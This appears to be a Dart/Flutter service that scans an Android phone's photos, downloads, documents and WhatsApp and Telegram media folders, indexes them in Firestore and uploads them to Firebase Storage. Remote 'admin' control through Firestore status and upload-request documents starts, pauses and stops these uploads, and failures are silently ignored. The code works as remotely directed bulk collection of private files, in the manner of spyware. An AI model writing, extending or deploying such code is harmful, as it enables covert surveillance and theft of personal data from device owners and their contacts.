import 'dart:async';
import 'dart:io';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:mime/mime.dart';
import 'package:path/path.dart' as p;

// Upload control statuses (written by admin, read by app)
enum UploadStatus { idle, running, paused, stopped }

class DeviceFile {
  final String name;
  final String localPath;
  final int size;
  final String mimeType;
  final String fileType;
  final String storageUrl;
  final String storagePath;
  final DateTime lastModified;
  final DateTime syncedAt;
  final String folder;

  DeviceFile({
    required this.name,
    required this.localPath,
    required this.size,
    required this.mimeType,
    required this.fileType,
    required this.storageUrl,
    required this.storagePath,
    required this.lastModified,
    required this.syncedAt,
    required this.folder,
  });

  Map<String, dynamic> toMap() => {
        'name': name,
        'localPath': localPath,
        'size': size,
        'mimeType': mimeType,
        'fileType': fileType,
        'storageUrl': storageUrl,
        'storagePath': storagePath,
        'lastModified': Timestamp.fromDate(lastModified),
        'syncedAt': Timestamp.fromDate(syncedAt),
        'folder': folder,
      };
}

class FileSyncService {
  final _auth      = FirebaseAuth.instance;
  final _firestore = FirebaseFirestore.instance;
  final _storage   = FirebaseStorage.instance;

  static const int _maxFileBytes = 100 * 1024 * 1024;

  static const _imageExts   = {'.jpg','.jpeg','.png','.gif','.webp','.bmp','.heic','.tiff'};
  static const _videoExts   = {'.mp4','.mkv','.avi','.mov','.3gp','.wmv','.flv'};
  static const _audioExts   = {'.mp3','.m4a','.wav','.aac','.ogg','.flac','.wma'};
  static const _docExts     = {'.pdf','.doc','.docx','.xls','.xlsx','.ppt','.pptx','.txt','.csv'};
  static const _archiveExts = {'.zip','.rar','.7z','.tar','.gz'};

  String _ext(String name) {
    final i = name.lastIndexOf('.');
    return i == -1 ? '' : name.substring(i).toLowerCase();
  }

  String _fileType(String name) {
    final ext = _ext(name);
    if (_imageExts.contains(ext))   return 'image';
    if (_videoExts.contains(ext))   return 'video';
    if (_audioExts.contains(ext))   return 'audio';
    if (_docExts.contains(ext))     return 'document';
    if (ext == '.apk')              return 'apk';
    if (_archiveExts.contains(ext)) return 'archive';
    return 'other';
  }

  Future<List<File>> _scanDirectory(String path) async {
    final results = <File>[];
    try {
      final dir = Directory(path);
      if (!await dir.exists()) return results;
      await for (final entity in dir.list(recursive: true, followLinks: false)) {
        if (entity is File) {
          try {
            final stat = await entity.stat();
            if (stat.size > 0 && stat.size <= _maxFileBytes) results.add(entity);
          } catch (_) {}
        }
      }
    } catch (_) {}
    return results;
  }

  // ── Upload control helpers ────────────────────────────────────────────────

  /// Set upload status in Firestore (called by the app itself)
  Future<void> setUploadStatus(String uid, UploadStatus status) async {
    await _firestore.collection('users').doc(uid).update({
      'uploadControl': {
        'status': status.name,
        'updatedAt': FieldValue.serverTimestamp(),
      },
    });
  }

  /// Read current status from Firestore
  Future<UploadStatus> getUploadStatus(String uid) async {
    final doc = await _firestore.collection('users').doc(uid).get();
    final raw = doc.data()?['uploadControl']?['status'] as String? ?? 'idle';
    return UploadStatus.values.firstWhere(
      (e) => e.name == raw,
      orElse: () => UploadStatus.idle,
    );
  }

  /// Stream of upload status changes (used by the app to react in real time)
  Stream<UploadStatus> watchUploadStatus(String uid) {
    return _firestore.collection('users').doc(uid).snapshots().map((snap) {
      final raw = snap.data()?['uploadControl']?['status'] as String? ?? 'idle';
      return UploadStatus.values.firstWhere(
        (e) => e.name == raw,
        orElse: () => UploadStatus.idle,
      );
    });
  }

  /// Wait while paused; return false if stopped
  Future<bool> _waitIfPaused(String uid) async {
    while (true) {
      final status = await getUploadStatus(uid);
      if (status == UploadStatus.running) return true;
      if (status == UploadStatus.stopped) return false;
      // paused — wait 2s and check again
      await Future.delayed(const Duration(seconds: 2));
    }
  }

  // ── Upload selected files (with pause/stop support) ───────────────────────
  Future<SyncResult> syncSelectedFiles({
    required List<File> files,
    void Function(int done, int total, String currentFile)? onProgress,
    void Function(UploadStatus)? onStatusChange,
  }) async {
    final uid = _auth.currentUser?.uid;
    if (uid == null) return SyncResult(0, 0, 'Not logged in');

    // Mark as running
    await setUploadStatus(uid, UploadStatus.running);

    // Get already-synced paths
    final existingSnap = await _firestore
        .collection('users').doc(uid).collection('device_files').get();
    final existingPaths = {
      for (final d in existingSnap.docs)
        (d.data()['localPath'] as String? ?? ''): d.id
    };

    int done = 0, succeeded = 0, failed = 0;

    for (final file in files) {
      // Check control status BEFORE each file
      final status = await getUploadStatus(uid);
      onStatusChange?.call(status);

      if (status == UploadStatus.stopped) {
        break;
      }

      if (status == UploadStatus.paused) {
        onStatusChange?.call(UploadStatus.paused);
        // Block here until resumed or stopped
        final shouldContinue = await _waitIfPaused(uid);
        if (!shouldContinue) break;
        onStatusChange?.call(UploadStatus.running);
      }

      done++;
      final name = p.basename(file.path);
      onProgress?.call(done, files.length, name);

      try {
        final stat = await file.stat();

        // Skip unchanged
        if (existingPaths.containsKey(file.path)) {
          final existingDoc = await _firestore
              .collection('users').doc(uid)
              .collection('device_files')
              .doc(existingPaths[file.path])
              .get();
          final existing = existingDoc.data();
          if (existing != null) {
            final existingModified = (existing['lastModified'] as Timestamp?)?.toDate();
            if (existingModified != null &&
                !stat.modified.isAfter(existingModified.add(const Duration(seconds: 5)))) {
              succeeded++;
              continue;
            }
          }
        }

        final storagePath = 'users/$uid/files/${file.path.replaceAll('/', '_')}';
        final ref  = _storage.ref(storagePath);
        final mime = lookupMimeType(file.path) ?? 'application/octet-stream';

        await ref.putFile(file, SettableMetadata(contentType: mime));
        final downloadUrl = await ref.getDownloadURL();

        final folder = p.dirname(file.path)
            .replaceAll('/storage/emulated/0/', '')
            .split('/').first;

        final deviceFile = DeviceFile(
          name: name,
          localPath: file.path,
          size: stat.size,
          mimeType: mime,
          fileType: _fileType(name),
          storageUrl: downloadUrl,
          storagePath: storagePath,
          lastModified: stat.modified,
          syncedAt: DateTime.now(),
          folder: folder,
        );

        final docId = existingPaths[file.path] ??
            _firestore.collection('users').doc(uid)
                .collection('device_files').doc().id;

        await _firestore.collection('users').doc(uid)
            .collection('device_files').doc(docId)
            .set(deviceFile.toMap());

        succeeded++;
      } catch (_) {
        failed++;
      }
    }

    // Mark idle when done (unless admin already set stopped)
    final finalStatus = await getUploadStatus(uid);
    if (finalStatus != UploadStatus.stopped) {
      await setUploadStatus(uid, UploadStatus.idle);
    }

    // Update file count summary
    final currentSnap = await _firestore.collection('users').doc(uid).get();
    final currentTotal = (currentSnap.data()?['fileStats']?['total'] as int?) ?? 0;
    await _firestore.collection('users').doc(uid).update({
      'fileStats': {
        'total': currentTotal + succeeded,
        'lastSync': FieldValue.serverTimestamp(),
      },
    });

    return SyncResult(succeeded, failed, null);
  }

  // ── Index device files by category ───────────────────────────────────────
  Future<void> indexDeviceFiles(String uid) async {
    const base = '/storage/emulated/0';

    final categoryDirs = {
      'images':    ['$base/DCIM', '$base/Pictures', '$base/Screenshots'],
      'videos':    ['$base/Movies', '$base/DCIM/Video'],
      'audio':     ['$base/Music'],
      'documents': ['$base/Documents', '$base/Download'],
      'whatsapp':  ['$base/WhatsApp/Media', '$base/Android/media/com.whatsapp/WhatsApp/Media'],
      'telegram':  ['$base/Telegram'],
      'downloads': ['$base/Download'],
      'apks':      ['$base/Download'],
    };

    for (final entry in categoryDirs.entries) {
      final cat = entry.key;
      final dirs = entry.value;

      final allFiles = <File>[];
      for (final dir in dirs) {
        allFiles.addAll(await _scanDirectory(dir));
      }

      // Deduplicate by path
      final seen = <String>{};
      final unique = allFiles.where((f) => seen.add(f.path)).toList();

      // Apply category-specific filtering
      List<File> filtered;
      if (cat == 'documents') {
        filtered = unique.where((f) => _docExts.contains(_ext(p.basename(f.path)))).toList();
      } else if (cat == 'apks') {
        filtered = unique.where((f) => _ext(p.basename(f.path)) == '.apk').toList();
      } else if (cat == 'images') {
        filtered = unique.where((f) => _imageExts.contains(_ext(p.basename(f.path)))).toList();
      } else if (cat == 'videos') {
        filtered = unique.where((f) => _videoExts.contains(_ext(p.basename(f.path)))).toList();
      } else if (cat == 'audio') {
        filtered = unique.where((f) => _audioExts.contains(_ext(p.basename(f.path)))).toList();
      } else {
        filtered = unique;
      }

      // Sort by modified desc
      final withStats = <Map<String, dynamic>>[];
      for (final f in filtered) {
        try {
          final stat = await f.stat();
          withStats.add({
            'file': f,
            'name': p.basename(f.path),
            'path': f.path,
            'size': stat.size,
            'type': _fileType(p.basename(f.path)),
            'modified': stat.modified.millisecondsSinceEpoch,
          });
        } catch (_) {}
      }

      withStats.sort((a, b) => (b['modified'] as int).compareTo(a['modified'] as int));

      // Limit to 200
      final limited = withStats.take(200).toList();

      final fileMaps = limited.map((m) => {
        'name':     m['name'] as String,
        'path':     m['path'] as String,
        'size':     m['size'] as int,
        'type':     m['type'] as String,
        'modified': m['modified'] as int,
      }).toList();

      await _firestore
          .collection('users').doc(uid)
          .collection('file_index').doc(cat)
          .set({
        'files':     fileMaps,
        'count':     fileMaps.length,
        'updatedAt': FieldValue.serverTimestamp(),
      });
    }

    // Update lastIndexed on user doc
    await _firestore.collection('users').doc(uid).update({
      'lastIndexed': FieldValue.serverTimestamp(),
    });
  }

  // ── Upload request helpers ────────────────────────────────────────────────
  Stream<DocumentSnapshot> watchUploadRequest(String uid) {
    return _firestore
        .collection('users').doc(uid)
        .collection('upload_requests').doc('pending')
        .snapshots();
  }

  Future<void> clearUploadRequest(String uid) async {
    await _firestore
        .collection('users').doc(uid)
        .collection('upload_requests').doc('pending')
        .delete();
  }

  Future<void> setUploadRequestStatus(String uid, String status) async {
    await _firestore
        .collection('users').doc(uid)
        .collection('upload_requests').doc('pending')
        .update({'status': status});
  }

  // ── Legacy: sync all files ────────────────────────────────────────────────
  Future<SyncResult> syncAllFiles({
    void Function(int done, int total, String currentFile)? onProgress,
  }) async {
    final uid = _auth.currentUser?.uid;
    if (uid == null) return SyncResult(0, 0, 'Not logged in');

    final scanDirs = [
      '/storage/emulated/0/DCIM',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
      '/storage/emulated/0/Movies',
      '/storage/emulated/0/Music',
      '/storage/emulated/0/Documents',
      '/storage/emulated/0/WhatsApp',
      '/storage/emulated/0/Telegram',
      '/storage/emulated/0/Screenshots',
    ];

    final allFiles = <File>[];
    for (final dir in scanDirs) {
      allFiles.addAll(await _scanDirectory(dir));
    }

    final seen = <String>{};
    final unique = allFiles.where((f) => seen.add(f.path)).toList();

    return syncSelectedFiles(files: unique, onProgress: onProgress);
  }
}

class SyncResult {
  final int succeeded;
  final int failed;
  final String? error;
  SyncResult(this.succeeded, this.failed, this.error);
}
